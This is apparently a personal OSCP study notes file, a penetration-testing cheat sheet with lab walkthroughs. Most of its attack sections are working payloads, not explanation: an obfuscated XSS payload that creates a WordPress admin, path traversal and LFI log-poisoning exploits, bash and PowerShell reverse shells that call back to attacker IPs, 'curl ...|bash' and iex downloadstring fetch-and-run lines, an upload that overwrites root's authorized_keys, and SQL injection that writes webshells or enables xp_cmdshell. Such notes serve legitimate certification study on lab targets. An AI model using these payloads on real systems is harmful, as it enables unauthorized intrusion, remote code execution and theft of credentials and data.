# OSCP
Journey to earning Offsec's OSCP


---
## DNS ENUMERATION

### HOST
```
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(cat protocols.txt); do host ${ip}.megacorpone.com; done
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```
### DNSRECON
```
dnsrecon -d megacorpone.com -t std
```
//type standard

### DNSENUM
```
dnsenum megacorpone.com
```
//more powerful than dnsrecon

### NSLOOKUP
```
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```
//on windows


---

### NC
```
nc -nvv -w 1 -z 192.168.88.188 888-8888
```
//as port scanner
//-w is connection timeout in second
//-z for zero i/o mode --scanning only --sending no data
//on wireshark, receiving SYN-ACK back means port is open
//RST-ACK == reject
//FIN-ACK == closing connection

```
nc -nv -u -z -w 1 192.168.50.149 120-123
```
//-u for udp
//port unreachable means it's closed


---
### NMAP
```
sudo nmap -sS
```
//syn scan option -- not completing the handshake so quicker -- but no longer stealthy -- requires raw sockets so
needing sudo
//rustscan is nmap alternative -- faster -- but louder

```
sudo nmap -sU
```
//scanning udp ports -- requiring raw sockets so need sudo

```
nmap -oG web-sweep.txt
```
//saving to a txt file

```
nmap -A --top-ports=20
```
//-A aggressive -- including os version detection, script scanning, and traceroute

```
nmap -p 80 192.168.80.1-253
```
//specify ports and across network

```
sudo nmap -Pn -sS -p- 192.168.105.52 -vvv -T5
```
//first a quick run thru all ports without running scripts or version

```
sudo nmap -Pn -sCV -p 59811 192.168.105.52 -vvv -T4
```
//now that we got a specific open ports we run scripts and ver on it

```
sudo nmap -Pn -sS --script http-title -p 80,443 192.168.105.0/24 -vvv -T4 -oG openports.txt

nmap -v -p 139,445 --script smb-os-discovery 192.168.105.152

sudo nmap --script-updatedb

sudo nmap -sV -p 443 --script “http-vuln-cve2021-41773.nse” 192.168.105.13 -vvv
```
//nmap found the vuln and provided payload to verify -- `curl https://192.168.105.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
//and we got content of /etc/passwd
//note that run this on browser and it doesnt work -- curl does
```
sudo nmap -p 80 --script “http-enum” 192.168.105.13
```
//fingerprinting web server


---
### IPTABLES
```
sudo iptables -vn -L
```
//-L lists rules present in all chains -- -v verbose -- -n numeric output

```
sudo iptables -Z
```
//-Z zero the packets and bytes in all chain



---
### TEST-NETCONNECTION
```
test-netconnection -port 445 192.168.88.188
```
//lolbas in windows -- using powershell built-in script `1..1024 | % { echo ((new-object net.sockets.tcpclient).connect("192.168.88.168", $_)) "TCP port $_ is open"} 2>$null`


---
### NET VIEW
```
net view \\dc01 /all
```
//lists shares running on DC01 -- /all to list admin shares that end with $ as well


----
### SMTP

CONNECT VIA NC / TELNET
~~~~~~~~~~~~~~~~
nc -nv <ip> 25
telnet <ip> 25
VRFY root
VRFY tool
~~~~~~~~~~~~~~~~

CONNECT WITH PYTHON SCRIPT -- VRIFY.PY

```
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 3:
print("Usage: vrfy.py <username> <target_ip>")
sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

# Close the socket
s.close()
```

---
### SNMP
```
sudo nmap -sU --open -p 161 192.168.105.1-254 -vvv -oG open-snmp.txt
```

```
for ip in $(seq 1 254); do echo 192.168.105.${ip}; done > ips
```
//create a port wordlist

```
onesixyone -c community -i ips
```

```
snmpwalk -c public -v1 -t 10 192.168.105.151
```
```
snmpwalk -c public -v1 -t 10 192.168.105.151 1.3.6.1.2.1.25.4.2.1.2
```
//specify OID

```
snmpwalk -c public -v1 -t 10 -Oa 192.168.105.151 1.3.6.1.2.1.2
//-Oa to convert hex string into ascii
```

---
### FFUF
```
ffuf -c -X POST -w passwd.txt -u http://192.168.105.52/login.php -d "username=admin&password=FUZZ&
debug=0" -H "Content-Type: application/x-www-form-urlencoded"
```
//gotta include content-type

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w vers.txt:VERS -u
http://offsecwp:5002/FUZZ/VERS
```
//sorta like pattern files
//in vers.txt we got /v1, /v2 and so on
//in this case it finds /users/v1
ffuf -u "http://target.com/FUZZ.EXT" -w /path/to/wordlist.txt -w /path/to/extensions.txt:EXT
//fuzz thru extensions

```
-ac
```
//auto calibrate -- could come in handy



---
### CURL

```
curl -i http://offsecwp:5002

curl -i http://offsecwp:5002/users/v1
//found users

curl -i http://offsecwp:5002/users/v1/admin
//found admin's email

curl -i http://offsecwp:5002/users/v1/admin/password
//found api to password -- need password

curl -i http://offsecwp:5002/users/v1/login
//found api to log in -- will need password

curl -i http://offsecwp:5002/users/v1/register
//doesnt throw error but saying no user found -- so this api is valid

curl -i http://offsecwp:5002/users/v1/register -d '{"username": “kali”, “password”, “kali”}' -H 'Content-Type:
application/json'
//says email field missing

curl -i http://offsecwp:5002/users/v1/register -d '{"username": “kali”, “password”, “kali”, “email”,
"kali@kali.com", “admin”: “True”}' -H 'Content-Type: application/json'
//include email but also sneak in admin: true to see if we could add ourself as admin --and it works

curl -i http://offsecwp:5002/users/v1/login -d '{"username":"kali", “password”: “kali”}' -H 'Content-Type:
application/json'
//and receive a jwt token for auth

curl -X PUT -i http://offsecwp:5002/users/v1/admin/password -d '{"password": “pwn3d”}' -H 'Content-Type:
application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJleHAiOjE3NDIzNTg5MzIsImlhdCI6MTc0MjM1ODYzMiwic3ViIjoia2FsaWFkbWluIn0.IEvtxoH2L_
xvDYOEgd2Ad52SgDDI2XGcJlEKA5b4JXY'
//it returns 204 code. not necesarily an error

curl -i http://offsecwp:5002/users/v1/login -d '{"username": “admin”, "password": “pwn3d”}' -H 'Content-Type:
application/json'
//and success -- it gives us a new jwt token -- we're admin
```

---

### SITEMAP.XML && ROBOTS.TXT
//check both



---
### XSS


//adds another admin
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;

ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();

var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@
offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";

ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
//jscompress.com -- to minify it


//and get this
```
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="
([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(
ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_createuser="+
nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&
pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",
requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-formurlencoded"),
ajaxRequest.send(params);
```

//next use this encode function to encode the minified code above
//charCodeAt method will convert ecah character to its corresponding UTF-16 integer code
```
function encode_to_javascript(string) {
var input = string
var output = '';
for(pos = 0; pos < input.length; pos++) {
output += input.charCodeAt(pos);
if(pos != (input.length - 1)) {
output += ",";
}
}
return output;
}
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

//now in console in browser dev tools we put the payload inside the function and run it
```
function encode_to_javascript(string) { var input = string var output = ''; for(pos = 0; pos < input.length;
pos++) { output += input.charCodeAt(pos); if(pos != (input.length - 1)) { output += ","; } } return output; } let
encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/usernew.
php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.
send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="
action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@
offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new
XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-
Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);') console.log(encoded)
```

//and get `118,97,114,32,97,.....`


//next we use fromCharCode method to decode the encoded string
//and run it with eval()
```
curl -i http://offsecwp --user-agent “<script>eval(String.fromCharCode(118,97,114,32,97,
106,97,120,82,101,113,117,101,115,116,61,...115,41,59))</script>” --proxy 127.0.0.1:8080
```
//on burp turn intercept on
//send this to burp so we can inspect it further
//looks good on burp -- we forward it
//then on admin dashboard click on Visitor and should see another session
//then click on Users and should see ourself as the second admin
//note that the real admin has to trigger the xss first by clicking Visitor, otherwise we wont have been added yet
//then edit plugin and sneak in a php webshell -- make sure to activate the plugin



---
### IPTABLES

```
iptables -L -v -n
```
//check firewall rules
or
```
vim /etc/iptables/rules.v4 
```
// Debian-based



---
### PATH TRAVERSAL

//look for a url that may include content of a page via a parameter like page or file
//check `/etc/passwd`
//then check for private ssh key -- `../../../../../../../home/user/.ssh/id_rsa`
//for WINDOWS, /etc/hosts is at -- `\windows\system32\drivers\etc\hosts`
//IIS web root -- `\inetpub\wwwroot`
//IIS log files -- `\inetpub\logs\logfiles\W3SVC1`
//IIS config files -- `\inetpub\wwwroot\web.config`
//XAMPP logfiles -- ` \xampp\apache\logs\access.log`

```
curl --path-as-is http://192.168.xxx.xx:3000/public/plugins/alertlist/../../../../../../../../users/install.txt
```
//Grafana vuln

```
curl -i http://192.168.xxx.xx/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/
passwords
```
//ENCODING trick to exploit vuln in Apache 2.4.49 cgi-bin

```
curl --path-as-is http://192.168.xxx.xx:3000/public/plugins/alertlist/..%2F../../%2e%2e/../../../..%2Fetc/passwd
```
//this works too



---
### RCE VIA LFI + LOG POISONING

//the role of path traversal is merely for displaying contents
//the rold of LFI is to include a file in the web app's running code or 'executing' files/code
```
curl http://mountainsahara.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
//apache2's log file is in /var/log/apache2/access.log
//user-agent info shows up in there -- meaning we may be able to sneak code in since we have control over useragent
//use curl or burp to sneak in our webshell `<?php echo system($_GET['cmd']); ?>`
//on burp -- we could try `ls%20-la` or `id` first
//then just get url-encoded bash rev shell

```
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%
20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%
2E45%2E888%2F8888%200%3E%261%27 HTTP/1.1
Host: mountainsahara.com
User-Agent: Mozilla
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```




---
### PHP WRAPPER

```
curl “<target>?page=php://filter/convert.base64-encode/resource=admin.php”
```
```
curl "<target>?page=data://text/plain, <?php%20echo%20system('ls'); ?>"
```
```
curl "http://192.168.xxx.xx/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-
a');%20?>"
```
//could use --data-urlencode


---
### RFI

//happens when web application loads files or contents from remote systems
```
curl -s "http://192.168.xxx.xx/meteor/index.php?page=http://192.168.xx.xxx/simple-backdoor.php&cmd=ls"
```
```
curl -s "http://192.168.xxx.xx/meteor/index.php?page=http://192.168.xx.xxx/rev.php"
```
//fire up python server and nc and have target hit our php rev shell


---
### FILE UPLOAD VULN

- always try to figure our tech stack first -- target OS, web server, db, front/backend language

- upload a normal txt file or other harmless extensions to see if it works at all

- try changing extension by capitalizing it
```
pHp
pHP
```

-then find out where the upload folder is
```
curl "http://192.168.xxx.xxx/meteor/uploads/shell.php?cmd=powershell%20-e%
20JABjAGwAaQ....GUAKAApAA=="
```
use powershell base64 payload to shoot a rev shell back at us

extensions to try:
```
phtml
php5
php7
```




for NONEXECUTABLE FILES:
- if stuck in file upload scenario where unable to determine attack vector or /uploads directory -- we could just try and overwrite a file
- e.g. write our public in authorized_keys file
- in burp -- try `../../../../../../shell.txt` under filename and see if it goes thru
- then in content paste in our public key and change filename path to `../../../../../../root/.ssh/authorized_keys`
- effectively overwrite root's ssh file -- worth a try
```
POST /upload HTTP/1.1
Host: mountainsahara.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------336674986838825001422879852255
Content-Length: 362
Origin: http://mountainsahara.com:8000
Connection: keep-alive
Referer: http://mountainsahara.com:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
-----------------------------3366749xxxxxxxxxxxx852255
Content-Disposition: form-data; name="myFile"; filename="../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream
<OUR SSH PUBLIC KEY>
-----------------------------3366749xxxxxxxxxxxx852255--
```



---
### COMMAND INJECTION

#### WINDOWS
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- check if system is running powershell or cmd
- be sure to url encode it first

```
curl -X POST http://192.168.116.189:8000/archive --data 'Archive=git%3B%28dir%202%3E%
261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell'
```
```
git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- will have target come grab our powercat.ps1 with downloadstring() and execute it for a rev shell
iex(new-object net.webclient).downloadstring("http://192.168.xx.xxx/powercat.ps1");powercat -c
192.168.xx.xxx -p 8888 -e powershell
- then url encode it

```
curl -X POST http://192.168.xxx.xxx:8000/archive --data 'Archive=git%3Biex%28new%
2Dobject%20net%2Ewebclient%29%2Edownloadstring%28%22http%3A%2F%2F192%2E168%2E45%2E217%
2Fpowercat%2Eps1%22%29%3Bpowercat%20%2Dc%20192%2E168%2E45%2E217%20%2Dp%208888%20%
2De%20powershell'
```
- and got a rev shell with this


#### LINUX
```
;id
```
// %3B
```
&& id
```
// %26%26
```
`id`
```
//%60id%60 -- backtick

//also try double url encoding
curl -X POST --data 'username=admin&password=&ffa=%60bash%20%2Dc%20%27bash%20%
2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2Exx%2Exxx%2F8888%200%3E%261%27%60'
http://192.168.xxx.xx/login
//wrapped in ` `

---
### FEROXBUSTER
```
feroxbuster -u http://192.168.159.192:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-largewords.
txt -x asp doc docx pdf --dont-scan .(png|jpg|css|js|jpeg)$ -C 404
```

---
### IMPACKET-SMBSERVER REV SHELL TRICK
```
impacket-smbserver share . -username <username> -password <passwd> -smb2support
```
```
\windows\system32\cmd.exe /c net use \\192.168.xx.xxx\share /user:<username> <passwd>
```
```
\windows\system32\cmd.exe /c \\192.168.xx.xxx\share\nc64.exe 192.168.xx.xxx 443 -e cmd.exe
```
- essentially we have target grab and execute nc64.exe on our system to give us a reverse shell
- no need to infil our nc over to target


---
### POWERSHELL IEX IWR REV SHELL TRICK

```
cmd /c powershell IEX(iwr http://192.168.xx.xxx/rev.ps1 -usebasicparsing)
```
//grab powershell payload from revshells.com


---
### IEX DOWNLOADSTRING REV SHELL TRICK

```
cmd /c powershell IEX(new-object net.webclient).downloadstring('http://192.168.xx.xxx/rev.ps1')
```



---
### SQL INJECTION

#### MYSQL

````
mysql -u root -p'root' -h 192.168.116.16 --skip-ssl-verify-server-cert
````
//or just

```
mysql -u root -p'root' -h 192.168.116.16 --skip-ssl
```
```
select column_name FROM information_schema.columns WHERE TABLE_SCHEMA = 'mysql' AND
TABLE_NAME = 'user';
```
```
select user,plugin from user where user = 'offsec';
```

---
### MSSQL
```
impacket-mssqlclient administrator:Lab123@192.168.116.18 -windows-auth
```
```
select @@version
```
```
select name from sys.databases;
```
```
select * from offsec.dbo.information_schema.tables;
```
```
select * from offsec.dbo.users;
```
```
select * from master.information_schema.tables;
```
```
select * from master.dbo.spt_values;
```
```
select * from master.dbo.sysusers;
```



#### ERROR-BASED

```
admin' or 1=1--
admin' or 1=1 in (select @@version)-- -
```
//mysql uses both @@version and version()


```
admin' or 1=1 in (select user())-- //
' or 1=1 in (select * from users)-- -
' or 1=1 in (select username from users)-- -
' or 1=1 (select password from users)-- -
' or 1=1 in (select password from users where username = 'admin')-- -
```

```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```
- load_file("/etc/passwd")
- real useful

```
/**/
```
//replaces whitespace



---
#### UNION-BASED
//need to satisfy 2 conditions
1. our query needs to include the same number of columns as the original query
2. data types need to be compatible between each column
`' order by 2-- -`
3. add one number till there's an error -- in this case 6 produces an error so there's 5 columns
`' union select 1,2,3,4,5-- -`
4. 2,3,4,5 are visible -- so we can leak data from those columns
`' union select 1, table_name, column_name, table_schema, null from information_schema.columns WHERE
table_schema=database()-- -`
5. with this we can see how many tables exist in current database() and what columns exist in those tables



---
### MSSQL CODE EXECUTION

#### XP_CMDSHELL
```
execute sp_configure 'show advanced options', 1;
reconfigure;
execute sp_configure 'xp_cmdshell', 1;
reconfigure;
execute xp_cmdshell 'whoami';
```
OR
```
'; exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1;
reconfigure; exec xp_cmdshell 'whoami';-- -
```
//one-liner


---
### MYSQL CODE EXECUTION

#### SELECT INTO OUTFILE TRICK
```
' union select 1, 2, “<?php system($_GET['cmd']); ?>”, 4, 5 into outfile “/var/www/html/tmp/webshell.php” -- -
http://192.168.xxx.xx/tmp/webshell.php?cmd=id
```
```
curl -G http://192.168.xx.xx/tmp/webshell.php --data-urlencode 'cmd=id'
```
//super useful





---
### SQLMAP

**Note: NOT allowed for the OSCP exam

```
sqlmap -u http://192.168.116.19/blindsqli.php?user=admin -p user
```
//-p for param


```
sqlmap http://192.168.116.19/blindsqli.php?user=admin --dbs
sqlmap http://192.168.116.19/blindsqli.php?user=admin -D offsec --tables
sqlmap http://192.168.116.19/blindsqli.php?user=admin -D offsec -T users --dump
```

#### OS-SHELL MODULE
- to do --os-shell option we need to first grab post request from burp
- save it as post.txt
```
sqlmap -r post.txt -p item --os-shell --web-root “/var/www/html/tmp”
```






---
### SAMPLE ATTACK SCENARIO

```
wpscan --url http://alibaba-eatery.org --enumerate ap,at --plugins-detection aggressive --api-token
<your api token>
```
- sometimes need the API token or they wont show vulns
- wpscan found a bunch of vulns but this one stands out as unauthenticated SQLi
- POC https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/
http://alibaba-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%
20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%
2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users

//the payload in the poc is:
```
1 union select 1,1,char(116,101,120,116),user_login,user_pass,0,0,null,null,null,null,null,null,null,null,null
from wp_users
```
- found a potential hash for admin
`$P$BINTaLa8Qxxxxxxm2P/nI0`
- ran hashid on it and it's phpass
```
hashcat --help | grep -i phpass
```
//-m 400

```
hashcat -m 400 wphash /usr/share/wordlists/rockyou.txt
```
- cracked it -- alibaboon
- then log in at alibaba-eatery/wp-login.php
- tried uploading new php plug in but too much of a waste of time
- went ahead and just edited existing plugins by adding in a webshell code `<?php echo system($_GET['cmd'}); ?>` --
akismet -- hello dolly -- then activate them
- but couldn't find where the files are stored -- they're not on the web root
- enum around and default root for wordpress plugins is at /wp-content/wp-plugins/ `https://www.exploit-db.com/exploits/48979`

```
http://alibaba-eatery.org/wp-content/plugins/hello.php?cmd=ls%20-la
```
//finally got a web shell working

```
curl -G http://alibaba-eatery.org/wp-content/plugins/hello.php --data-urlencode 'cmd=id'
```
- works on curl
- for some reason couldnt get a rev shell. Tried both nc openbsd and bash
- fired up our python server then
```curl -G http://alibaba-eatery.org/wp-content/plugins/hello.php --data-urlencode 'cmd=curl http://192.168.45.248/'```
- our server is hit -- so outbound connection should be allowed
- host our own bashrev.sh
```
bash -i >& /dev/tcp/192.168.45.248/8888 0>&1
```
```
chmod +x bashrev.sh
```
```
curl -G http://alibaba-eatery.org/wp-content/plugins/hello.php --data-urlencode 'cmd=curl
http://192.168.45.248/bashrev.sh|bash'
```
- ran curl to have target run our bashrev.sh
- and finally got a working rev shell
- enum and found flag in /var/www




---
### SAMPLE SQLi ATTACK SCENARIOS

//fire up burp -- intercept -- repeater -- send normal request
```
mail-list=test@test.com
```
//noticed content-length 14129
```
mail-list='
```
//content-length changed to 14292
```
mail-list='-- -
```
//content-length back to normal 14129
```
' order by 2-- -
```
//content-length 14129 normal -- then tried all the way up to 7
```
' order by 7-- -
```
//changed to 14179 -- so there's 6 columns
```
' union select 1,2,3,4,5,6-- -
```
- lots of html code so difficult to notice changes
- use burp comparer to compare the code and found -- `<span>5</span> <!-- end subscribe section -->`
- search `<!-- end subscribe section → on repeater to lock this text` and set autoscroll when text changes
- we can see that column 5 is the only one exposed

```
' union select 1,2,3,4,@@version,6-- -
```
//8.0.29

```
' union select 1,2,3,4,user(),6-- -
```
//smeegol@localhost
```
' union select 1,2,3,4,schema_name,6 from information_schema.schemata-- -
```
//information_schema and animal_planet databases

```
' union select 1,2,3,4,concat(table_schema,":",table_name),6 from information_schema.tables where
table_schema = "animal_planet"--
```
//animal_planet:subscribers -- so only 1 table -- subscribers
```
' union select 1,2,3,4,group_concat("\n",table_schema,":",table_name,":",column_name,"\n"),6 from
information_schema.columns where table_name = 'subscribers'-- -
```
//columns are -- id -- emails -- is_donor -- donor_type -- status -- created_at -- looks likes there's no creds here
```
' union select 1,2,3,4,group_concat("\n",id,":",emails,":",status,"\n"),6 from subscribers-- -
```
//no useful info except user emails

```
sqlmap -r smeegol.req --level 5 --risk 3 --batch
```
//could also use sqlmap -- but rather not




#### SQLi LOAD_FILE() SAMPLE SCENARIO

```
' union select 1,2,3,4,load_file("/etc/passwd"),6-- -
```
//no regular user -- like ones with 1000 1001 ids

```
' union select 1,2,3,4,load_file("/root/.ssh/id_rsa"),6-- -
```
//nothing displayed
//no other users to check their id_rsa


```
' union select 1,2,3,4,load_file("/root/flag.txt"),6-- -
```
//nothing

```
' union select 1,2,3,4,load_file("/var/www/html/flag.txt"),6-- -
```
//nothing
//then remembered that there was dbconn.php

```
' union select 1,2,3,4,load_file("/var/www/html/dbconn.php"),6-- -
```
//found mysql passwd for smeegol : Hellotiger#
//this also confirms that /var/www/html is the web root

```
ssh smeegol@192.168.156.48
```
//tried to ssh in but doesnt work -- but no surprises since theres no regular user

```
mysql -usmeegol -p'Hellotiger#' -h '192.168.156.48 --skip-ssl
```
//tried to connect to mysql but doesnt work



#### TRY THE 'INTO OUTFILE' TRICK

```
' union select 1,2,3,4,"<?php system($_REQUEST['cmd']);?>",6 into outfile "/var/www/html/wshll.php"-- -
```
//not sure what else to try so gotta try the command exec with into outfile trick to sneak in a webshell
//no errors displayed -- should work

```
rlwrap -cAr nc -lnvp 53
```
//fire up our nc

```
curl -G http://junglesafe.lab/wshll.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.xx.xxx/53
0>&1"'
```
//and got a rev shell

```
find / -name flag.txt -type f -ls 2>/dev/null
```
//in var/www/flag.txt



---
#### POSTGRESQL SQLi ATTACK SCENARIO


//found class.php and contact.php that accept user input
// /mail/contact.php is exposed -- on burp it returns 500 internal server error -- worth looking into
//have burp intercept class.php -- trying manual sqli
```
weight=88&height=88&age=88&gender=Male&email=test@test.com
```
//normal response content-length is 27598

```
weight=88'&height=88&age=88'&gender=Male'&email=test@test.com'

```
//all these params still return normal content-length

```
weight=88&height=88'&age=88&gender=Male&email=test@test.com
```
//height param returns different content-length 27873
//use burp comparer to see where the error occured -- and its -- BMI Calculation End
//so search for it on repeater -- and set autoscroll to lock it in

```
weight=88&height=88'-- -&age=88'&gender=Male'&email=test@test.com'
```
//the comment -- - fixes the query -- so we should be good

```
weight=88&height=88' order by 7-- -&age=88'&gender=Male'&email=test@test.com'
```
//7 columns errors out -- so there's 6 columns

```
weight=88&height=88' union select 1,2,3,4,@@version,6-- -&age=88'&gender=Male'&email=test@test.com'
```
//but failed -- no columns leak data

//consult https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/
PostgreSQL%20Injection.md
```
' AND 1=CAST(pg_read_file('/etc/passwd', 0, 5000) AS NUMERIC)-- -
' AND 1=CAST(pg_read_file('/etc/apache2/apache2.conf', 0, 10000) AS NUMERIC)-- -
' AND 1=CAST(pg_read_file('/var/www/html/dbcon.php', 0, 10000) AS NUMERIC)-- -
```
//found creds

```
ssh rubben@192.168.156.49
```
//again failed

```
' AND 1=CAST(pg_read_file('/var/www/flag.txt', 0, 10000) AS NUMERIC)-- -
```
//found flag.txt

```
'; COPY (SELECT '<?php system($_REQUEST["cmd"]);?>') TO '/var/www/html/shll.php'-- -
```
//try to write webshell -- but got an error -- : `pg_query(): Query failed: ERROR: could not open file
&quot;/var/www/html/shll.php&quot; for writing: Permission denied -- HINT: COPY TO instructs the PostgreSQL server process to write a file. You may want a client-side facility such as psql's \copy. in <b>/var/www/html/class.php`

#### PSQL

```
psql -h 192.168.156.49 -U rubber -p 5432 -d glovedp
```
//since we found creds -- log in via psql

```
help
\h
```
```
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/mail/shll.php';
```
//tried to get a webshell -- but perm denied again -- to place file at /var/www/html

```
select version();
select user;
select pg_ls_dir('/');
select pg_ls_dir('/var/www/html');
select pg_ls_dir('/var/www');
```
//and found flag

---
#### SQLi MSSQL ATTACK SCENARIO

//http://192.168.xxx.xx/login.aspx
//sent to burp repeater
```
admin'
admin"
```
//sent both to comparer and the ' causes an error
```
admin'-- -
```
//fixes it
//right click + urlencode as typing

##### UNION-BASED
```
' order by 2-- -
' order by 3-- -
```
//there's errors -- so only 2 columns

```
' union select 1,2-- -
```
//nothing leaking -- so should try error-based


##### ERROR-BASED
```
' + cast((SELECT @@version) as int) + '-- -
```
//tried this error-based payload but it says syntax error at CAST AS --and not leaking version

```
'convert(int,@@version)-- -
```
//tried another error-based payload --it says it's expecting boolean -- not leaking version
//so move on to boolean-based


##### BOOLEAN-BASED
```
' and is_srvrolemember('sysadmin') = 1-- -
```
//no errors -- note content-length 4688

```
' and is_srvrolemember('sysadmin') = 0-- -
```
//also no errors -- same content-length 4688
//meaning should try time-based


##### TIME-BASED
```
' waitfor delay '0:0:5'-- -
```
//time-based works -- it hangs for about 5 sec

```
' if (1=1) waitfor delay '0:0:5'-- -
```
//it hangs
```
' if (1=0) waitfor delay '0:0:5'-- -
```
//no hanging -- so time-based confirms

```
' IF(IS_SRVROLEMEMBER('sysadmin') = 1) WAITFOR DELAY '0:0:5'--
```
//see if user is sysadmin via time-based payload -- and yes it hangs

```
' if (is_srvrolemember('sysadmin') = 0) waitfor delay '0:0:5'-- -
```
//no hanging -- confirms we're sysadmin

```
'+IF+(OBJECT_ID('dbo.users')+IS+NOT+NULL)+WAITFOR+DELAY+'0:0:5'--+-
```
//yes users table exists -- it hangs
```
'+IF+((SELECT+COUNT(*)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users')>1)+WAITFOR+DELAY+'0:0:5'--+-
```
//changed number of columns and apparently there's 2 -- it hangs at 1 and doesnt at 2 -- so more than 1 column but
not more than 2 -- so 2 columns

```
' IF(ASCII(SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' ORDER BY ORDINAL_POSITION OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1))=117) WAITFOR DELAY '0:0:5'-- -
```
//check for name of first column (offset 0) -- in users table -- 117 is number of char in ascii
```
' IF((SELECT COUNT(*) FROM Users) > 0) WAITFOR DELAY '0:0:5'-- -
```
//check if there's any data in users table -- and there's no hang no burp -- meaning data might not exist
```
' if ( (select count(*) from webapp.dbo.users) = 0) waitfor delay '0:0:5'-- -
```
//checking table users of webapp database if it's really empty -- and it is --cause it hangs

```
' if (is_member('db_owner') = 1) waitfor delay '0:0:5'-- -
```
//it hangs -- so we're db_owner

```
' IF(ASCII(SUBSTRING((SELECT TOP 1 TABLE_SCHEMA FROM webapp.INFORMATION_SCHEMA.TABLES),1,1))=ASCII_VAL) WAITFOR DELAY '0:0:5'-- -
```
//check if the current schema is DBO -- and yes it is
```
' if (ASCII(SUBSTRING(SELECT password FROM webapp.dbo.users ORDER BY password OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY, {position}, 1)) = {ascii_val}) WAITFOR DELAY '0:0:5'-- -
```
//see if there's any password in users table in DBO table_schema and webapp db

```
' IF(ASCII(SUBSTRING((SELECT name FROM master..sysdatabases ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {position}, 1)) = {ascii_val}) WAITFOR DELAY '0:0:5'-- -
//so back to enumerate name of databases with this payload
//our script will start from offset 0 -- position 1 -- then ascii_val 32 - 126
//first db == master
//second db == model
//third db == msdb
//4th db == tempdb
//5th db = webapp
```

```
